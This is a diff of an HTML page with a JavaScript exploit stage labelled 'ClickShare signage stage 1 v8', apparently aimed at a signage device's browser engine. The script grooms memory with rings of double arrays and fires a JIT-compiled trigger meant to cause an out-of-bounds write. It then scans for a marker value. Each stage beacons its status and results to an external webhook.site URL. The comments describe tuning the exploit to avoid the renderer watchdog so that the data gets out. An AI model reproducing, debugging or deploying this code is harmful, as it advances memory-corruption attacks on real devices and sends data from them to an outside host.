@@ -1,27 +1,33 @@
 <html><body><script>
-// ClickShare signage -- stage 1 v5. FIX (evidence-driven): the OOB store lands 16 bytes past
-// oob_array's 40-byte FixedDoubleArray backing store => into the NEXT object's map => crash.
-// So the victim must be the object allocated IMMEDIATELY AFTER oob_array (and the PoC's own
-// `arrx` is exactly that). Sync XHR beacons: delivery is guaranteed before the crash.
+// ClickShare signage -- stage 1 v8. ROOT CAUSE FIXED (device log evidence):
+//  - v5 died because sync XHR froze the main thread; v6/v7 died because a 3e6-iteration
+//    busy-wait after every beacon froze the main thread -> the baseunit watchdog kills the
+//    renderer -> "crash detected" before beacons flush. v2 (pure async) delivered 7/7.
+//  => PURE ASYNC beacons, zero blocking, bounded allocations.
+// Proof the device reaches the internet: it successfully loaded https://webhook.site/... at 22:53:46.
 const SINK = 'https://webhook.site/9b9f3ae6-9ca5-4a70-8d42-d9a45b78db92';
 const MARKER = 1.2345678901234e-300;
 function beacon(t, v){
-  // async Image() (proven in v2: 7/7 beacons delivered) -- a SYNC XHR freezes the renderer
-  try { new Image().src = SINK+'?t='+encodeURIComponent(t)+'&v='+encodeURIComponent(String(v).slice(0,150)); } catch(e){}
-  try { var n=0; for (var q=0;q<3e6;q++) n++; } catch(e){}   // ~20ms of main-thread time so the net thread flushes
+  try { var i = new Image(); i.src = SINK + '?t=' + encodeURIComponent(t) + '&v=' + encodeURIComponent(String(v).slice(0,150)); } catch(e){}
 }
-beacon('V7-start', navigator.userAgent.slice(0,80));
+beacon('V8-start', navigator.userAgent.slice(0,80));
 try {
-  var arrx = new Array(150); arrx[0] = 1.1;          // PoC's own victim (as in the reference exploit)
-  var local = [];                                     // per-poc victims, allocated right after oob_array
+  // bounded victim pool (ring of 48) - pre-filled with doubles => INLINE FixedDoubleArray
+  const RING = 48;
+  var ring = [];
+  for (let k = 0; k < RING; k++) { var a = new Array(64); for (let z = 0; z < 64; z++) a[z] = 1.0 + z; ring.push(a); }
+  var arrx = new Array(150); for (let z = 0; z < 150; z++) arrx[z] = 0.5 + z;
+  beacon('V8-pool-done', RING);
+
   var fake = new Uint32Array(10);
   for (var i=0;i<9;i++) fake[i] = i+1;
   fake[0]=1; fake[1]=3; fake[2]=2; fake[3]=4; fake[4]=5; fake[5]=6; fake[6]=7; fake[7]=8; fake[8]=9;
-  var tahir = 0x1;
+  var tahir = 0x1, slot = 0;
   function poc(a) {
     var oob_array = new Array(5); oob_array[0] = 0x500;
-    var victim = new Array(64); for (var z=0; z<64; z++) victim[z] = 1.0 + z;   // DOUBLE elements => FixedDoubleArray stored INLINE right after oob_array's store
-    local.push(victim); if (local.length > 400) local.shift();
+    // victim allocated immediately after oob_array (bump pointer in young gen) - slot reused, no growth
+    var victim = new Array(64); for (let z = 0; z < 64; z++) victim[z] = 1.0 + z;
+    ring[slot] = victim; slot = (slot + 1) % RING;
     let just_a_variable = fake[0];
     let another_variable3 = fake[7];
     if (a % 7 == 0) another_variable3 = 0xff00000000;
@@ -43,22 +49,22 @@ try {
     return [index, BigInt(just_a_variable)];
   }
   var hits = 0;
-  function beaconHits(tag){
-    for (let j = 0; j < 150; j++) { if (arrx[j] === MARKER) { beacon('HIT-arrx','at='+tag+' j='+j); hits++; break; } }
-    for (let k = 0; k < local.length; k++) {
-      var v = local[k];
-      if (v.length !== 64) { beacon('HIT-len','at='+tag+' k='+k+' len='+v.length); hits++; continue; }
-      for (let j = 0; j < 64; j++) { if (v[j] === MARKER) { beacon('HIT-mark','at='+tag+' k='+k+' j='+j); hits++; break; } }
+  function sweep(tag){
+    for (let j = 0; j < 150; j++) { if (arrx[j] === MARKER) { if (hits++ < 6) beacon('HIT-arrx','at='+tag+' j='+j); } }
+    for (let k = 0; k < ring.length; k++) {
+      var v = ring[k];
+      if (v.length !== 64) { if (hits++ < 6) beacon('HIT-len','at='+tag+' k='+k+' len='+v.length); continue; }
+      for (let j = 0; j < 64; j++) { if (v[j] === MARKER) { if (hits++ < 6) beacon('HIT-mark','at='+tag+' k='+k+' j='+j); break; } }
     }
-    beacon('V7-iter','at='+tag+' hits='+hits);
+    beacon('V8-iter','at='+tag+' hits='+hits);
   }
   for (let i = 2; i < 0x500; i++) poc(i);
-  beacon('V7-warm-done','ok'); beaconHits('warm');
-  for (let i = 0; i < 20000; i++) poc(i % 500 + 2);
-  beacon('V7-warm20k-done','ok'); beaconHits('warm20k');
+  beacon('V8-warm-done','ok'); sweep('warm');
+  for (let i = 0; i < 3000; i++) poc(i % 500 + 2);
+  beacon('V8-warm3k-done','ok'); sweep('warm3k');
   let triggers = [35, 70, 105];
-  for (let t = 0; t < triggers.length; t++) { beacon('V7-fire','a='+triggers[t]); poc(triggers[t]); beaconHits('a'+triggers[t]); }
-  beacon('V7-SURVIVED','hits='+hits);
-} catch (e) { beacon('V7-exc', String(e).slice(0,120)); }
-beacon('V7-done','end-of-page');
+  for (let t = 0; t < triggers.length; t++) { beacon('V8-fire','a='+triggers[t]); poc(triggers[t]); sweep('a'+triggers[t]); }
+  beacon('V8-SURVIVED','hits='+hits);
+} catch (e) { beacon('V8-exc', String(e).slice(0,120)); }
+beacon('V8-done','end-of-page');
 </script></body></html>
